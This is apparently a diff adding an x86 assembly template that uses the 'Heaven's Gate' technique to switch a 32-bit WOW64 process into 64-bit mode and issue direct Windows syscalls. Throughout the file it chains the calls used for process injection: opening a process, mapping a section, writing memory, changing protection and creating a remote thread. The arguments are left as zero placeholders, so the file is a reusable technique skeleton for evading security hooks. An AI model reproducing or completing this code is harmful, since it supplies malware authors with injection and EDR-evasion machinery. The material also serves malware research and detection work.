@@ -1,0 +1,205 @@
+call GetPC1
+GetPC1:
+add [esp], 5 
+retf			; Invoke Heaven's gate -- go x64
+
+db 0x41,0x8b,0x1c,0x24	; x64: mov ebx,dword ptr [r12]	
+		
+push 0x23
+call GetPC2
+GetPC2:
+mov [esp+4], 0x23
+add [esp], 0xa
+retf 			; Invoke Heaven's gate -- go x86
+
+mov ebx, [ebx+0x30]
+mov ebx, [ebx+0xac]
+mov ecx, esp
+sub esp, 0x1000
+
+cmp bl, 0xF0		; 21h2, Win11 release
+jl end
+push 0x18		; NtAllocateVirtualMemory
+push 0x36		; NtQuerySystemInformation
+push 0x26		; NtOpenProcess
+push 0x55		; NtCreateFile
+push 0x4a		; NtCreateSection
+push 0x28		; NtMapViewOfSection
+push 0x50		; NtProtectVirtualMemory
+push 0x3a		; NtWriteVirtualMemory
+push 0xc5		; NtCreateThreadEx
+push 0xd0004		; NtWaitForSingleObject
+
+saveSyscallArray:
+mov edi, esp
+mov esp, ecx
+
+push edi
+push 0x00000000 	; ULONG Protect
+push 0x00000000 	; ULONG AllocationType
+push 0x00000000 	; PSIZE_T RegionSize
+push 0x00000000 	; ULONG_PTR ZeroBits
+push 0x00000000 	; PVOID *BaseAddress
+push 0x00000000 	; HANDLE ProcessHandle
+
+mov eax, [edi+0x24]	; NtAllocateVirtualMemory syscall
+call ourSyscall
+
+mov edi, [esp+0x18]
+
+push edi
+push 0x00000000 	; PULONG ReturnLength
+push 0x00000000 	; ULONG SystemInformationLength
+push 0x00000000 	; PVOID SystemInformation
+push 0x00000000 	; SYSTEM_INFORMATION_CLASS SystemInformationClass
+
+mov eax, [edi+0x20]	; NtQuerySystemInformation syscall
+call ourSyscall
+
+mov edi, [esp+0x10]
+
+push edi
+push 0x00000000 	; PCLIENT_ID ClientId
+push 0x00000000 	; POBJECT_ATTRIBUTES ObjectAttributes
+push 0x00000000 	; ACCESS_MASK AccessMask
+push 0x00000000 	; PHANDLE ProcessHandle
+
+mov eax, [edi+0x1c]	; NtOpenProcess syscall
+call ourSyscall
+
+mov edi, [esp+0x10]
+
+push edi
+push 0x00000000 	; ULONG EaLength
+push 0x00000000 	; PVOID EaBuffer
+push 0x00000000 	; ULONG CreateOptions
+push 0x00000000 	; ULONG CreateDisposition
+push 0x00000000 	; ULONG ShareAccess
+push 0x00000000 	; ULONG FileAttributes
+push 0x00000000 	; PLARGE_INTEGER AllocationSize
+push 0x00000000 	; PIO_STATUS_BLOCK IoStatusBlock
+push 0x00000000 	; POBJECT_ATTRIBUTES ObjectAttributes
+push 0x00000000 	; ACCESS_MASK DesiredAccess
+push 0x00000000 	; PHANDLE FileHandle
+
+mov eax, [edi+0x18]	; NtCreateFile syscall
+call ourSyscall
+
+mov edi, [esp+0x2c]
+
+push edi
+push 0x00000000 	; HANDLE FileHandle
+push 0x00000000 	; ULONG AllocationAttributes
+push 0x00000000 	; ULONG SectionPageProtection
+push 0x00000000 	; PLARGE_INTEGER MaximumSize
+push 0x00000000 	; POBJECT_ATTRIBUTES ObjectAttributes
+push 0x00000000 	; ACCESS_MASK DesiredAccess
+push 0x00000000 	; PHANDLE SectionHandle
+
+mov eax, [edi+0x14]	; NtCreateSection syscall
+call ourSyscall
+
+mov edi, [esp+0x1c]
+
+push edi
+push 0x00000000 	; ULONG Protect
+push 0x00000000 	; ULONG AllocationType
+push 0x00000000 	; DWORD InheritDisposition
+push 0x00000000 	; PULONG ViewSize
+push 0x00000000 	; PLARGE_INTEGER SectionOffset
+push 0x00000000 	; ULONG CommitSize
+push 0x00000000 	; ULONG ZeroBits
+push 0x00000000 	; PVOID *BaseAddress
+push 0x00000000 	; HANDLE ProcessHandle
+push 0x00000000 	; HANDLE SectionHandle
+
+mov eax, [edi+0x10]	; NtMapViewOfSection syscall
+call ourSyscall
+
+mov edi, [esp+0x28]
+
+push edi
+push 0x00000000 	; PULONG OldAccessProtection
+push 0x00000000 	; ULONG NewAccessProtection
+push 0x00000000 	; PULONG NumberOfBytesToProtect
+push 0x00000000 	; PVOID *BaseAddress
+push 0x00000000 	; HANDLE ProcessHandle
+
+mov eax, [edi+0xc]	; NtProtectVirtualMemory syscall
+call ourSyscall
+
+mov edi, [esp+0x14]
+
+push edi
+push 0x00000000 	; PULONG NumberOfBytesWritten
+push 0x00000000 	; ULONG NumberOfBytesToWrite
+push 0x00000000 	; PVOID Buffer
+push 0x00000000 	; PVOID BaseAddress
+push 0x00000000 	; HANDLE ProcessHandle
+
+mov eax, [edi+0x8]	; NtWriteVirtualMemory syscall
+call ourSyscall
+
+mov edi, [esp+0x14]
+
+push edi
+push 0x00000000 	; PVOID AttributeList
+push 0x00000000 	; ULONG MaximumStackSize
+push 0x00000000 	; ULONG StackSize
+push 0x00000000 	; ULONG ZeroBits
+push 0x00000000 	; ULONG CreateFlags
+push 0x00000000 	; PVOID Argument
+push 0x00000000 	; PVOID StartR__OUTine
+push 0x00000000 	; HANDLE ProcessHandle
+push 0x00000000 	; POBJECT_ATTRIBUTES ObjectAttributes
+push 0x00000000 	; ACCESS_MASK DesiredAccess
+push 0x00000000 	; PHANDLE ThreadHandle
+
+mov eax, [edi+0x4]	; NtCreateThreadEx syscall
+call ourSyscall
+
+mov edi, [esp+0x2c]
+
+push edi
+push 0x00000000 	; PLARGE_INTEGER TimeOut
+push 0x00000000 	; BOOLEAN Alertable
+push 0x00000000 	; HANDLE ObjectHandle
+
+mov eax, [edi]		; NtWaitForSingleObject syscall
+call ourSyscall
+
+mov edi, [esp+0xc]
+
+jmp end
+
+ourSyscall:		; Syscall Function
+push 0x33		; Push 0x33 selector for 64-bit
+call nextRetf		; GetPC
+nextRetf:
+add [esp], 5		; Create destination for Heaven's gate
+retf			; Invoke Heaven's gate--transition to x64 code
+db 0x49,0x87,0xe6,0x45,0x8b,0x06,0x49,0x83,0xc6,0x04,0x45,0x89,0x45,0x3c,0x45,0x89,0x75,0x48,0x49,
+0x83,0xee,0x04,0x4d,0x8d,0x5e,0x04,0x41,0x89,0x7d,0x20,0x41,0x89,0x75,0x24,0x41,0x89,0x5d,0x28,0x41,
+0x89,0x6d,0x38,0x9c,0x41,0x58,0x45,0x89,0x45,0x44,0x89,0xc1,0xc1,0xe9,0x10,0x41,0xff,0x24,0xcf
+			; x64 code as bytes, leading to syscall
+			; xchg rsp,r14
+			; mov r8d,dword ptr [r14]
+			; add r14,4
+			; mov dword ptr [r13+3Ch],r8d	 # Save x86 EIP
+			; mov dword ptr [r13+48h],r14d	 # Save x86 ESP
+			; sub r14,4
+			; lea r11,[r14+4]            	 # Pointer to syscall args
+			; mov dword ptr [r13+20h],edi	 # Save 32-bit registers
+			; mov dword ptr [r13+24h],esi	 # into WOW64_CONTEXT
+			; mov dword ptr [r13+28h],ebx
+			; mov dword ptr [r13+38h],ebp
+			; pushfq                     
+			; pop r8                     	 # Save x86 EFlags
+			; mov dword ptr [r13+44h],r8d
+			; mov ecx,eax
+			; shr ecx,10h                	 # Get TurboThunk, if needed
+			; jmp qword ptr [r15+rcx*8]
+			
+
+end:
+nop
